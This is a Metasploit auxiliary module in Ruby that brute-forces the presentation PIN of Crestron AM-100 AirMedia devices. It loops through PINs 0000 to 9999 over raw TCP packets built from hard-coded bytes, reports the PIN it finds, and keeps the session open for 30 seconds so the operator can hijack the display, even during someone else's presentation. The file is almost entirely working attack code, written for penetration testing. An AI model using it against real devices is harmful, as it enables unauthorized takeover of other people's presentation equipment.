##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Crestron AM-100 AirMedia Presentation PIN Brute-Force',
      'Description'    => %q{
        This module brute-forces the PINs set on Crestron AM-100 AirMedia
        wireless presentation devices. PINs can be configured as: 1) none,
        2) static, 3) random. This tool will find static and random PINs.
        Once a PIN is found, the tool will keep the connection open for 30
        seconds to allow you to connect. This tool will work regardless of
        whether somebody is presenting on the display already or not, and
        will allow you to hijack the display.
        %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
        WARNING: You MUST set RHOST as the hostname of the device, not
        the IP address of the device.
      },
      'Author'         => [ 'David Noren <dcnoren[at]gmail.com>' ],
      'Version'        => '$Revision: 11 $',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.crestron.com/resources/product_and_programming_resources/catalogs_and_brochures/online_catalog/default.asp?jump=1&model=am-100'],
        ],
      'DisclosureDate' => 'Sep 24 2014'))

    register_options(
      [
        Opt::RHOST(''),
        Opt::RPORT(389),
        OptInt.new('MIN', [ true, "The lowest PIN to guess.", 0 ]),
        OptInt.new('MAX', [ true, "The highest PIN to guess.", 9999 ]),
      ], self.class)

  end

  def run
    connect

    started = false
    max = datastore['MAX']
    min = datastore['MIN']

    if max > 9999
      max = 9999
      print_error("Highest PIN value can be is 9999. Setting MAX to 9999 and continuing.")
    end
    if min > 9999
      min = 0
      print_error("Highest PIN value can be is 9999. Setting MIN to 0 and continuing.")
    end
    if min > max
      min = 0
      max = 9999
      print_error("MIN cannot be higher than MAX. Resetting to default values and continuing.")
    end

    counter = min

    while counter <= max do
      pinguess = "%04d" % counter
      sploit = ""
      sploit = "\x24\x01\xc7\x25\xa7\x40\x00\x21\xcc\xcd\x05\x39\x08\x00\x45\x00\x00\xb1\x7e\xed\x40\x00\x80\x06\x00\x00\x0a\x5d\x0e\x2d\x0a\x5d\x5c\xc4\x80\x18\x01\x85\xc1\x4f\x27\x70\x0b\x43\xe6\xde\x50\x18\x01\x00\x80\x4e\x00\x00\x77\x70\x70\x63\x6d\x64\x00\x00\x92"
      sploit += datastore['RHOST']
      sploit += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x5d\x0e\x2d"
      sploit += pinguess
      sploit += "\x00\x00\x00\x00\x0a\x0a\x14\x00\x01\x00\x00\x01\xff\x58\x4d\x4f\x50\x53\x44\x4b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      sock.put(sploit)
      rsploit = sock.recv(10)
      pinright = "\x77\x70\x70\x63\x6d\x64\x00\x00\x93\x01"
      pinwrong = "\x77\x70\x70\x63\x6d\x64\x00\x00\x93\x00"

      if rsploit == pinright
        print_status("Success! PIN is #{pinguess}")
        print_line("Sleeping for 30 seconds to let you connect")
        i = 1
        while i < 7 do
          sleep(5)
          sock.put(sploit)
          ic = i * 5
          print_line(">> #{ic} seconds")
          i = i + 1
        end
        print_line("Waiting to re-check PIN...")
        disconnect
        sleep(6)
        connect
        sock.put(sploit)
        rsploit = sock.recv(10)
        if rsploit == pinright
          print_status("PIN has not changed. You or somebody else must be connected.")
        elsif rsploit == pinwrong
          print_status("PIN has changed. Nobody was connected.")
        else
          print_error("Unrecognised response. Did you break the device?")
        end
        disconnect
        break
      elsif rsploit == pinwrong
        if counter % 500 == 0 && started == true
          print_line("Status: #{pinguess}")
        end
        if started == false
          print_status("Starting guessing at #{pinguess}")
          started = true
        end
      else
        print_error("Unrecognised response. Are you sure this is an AM-100?")
        break
      end
    counter = counter + 1
    end
  disconnect
  end
end

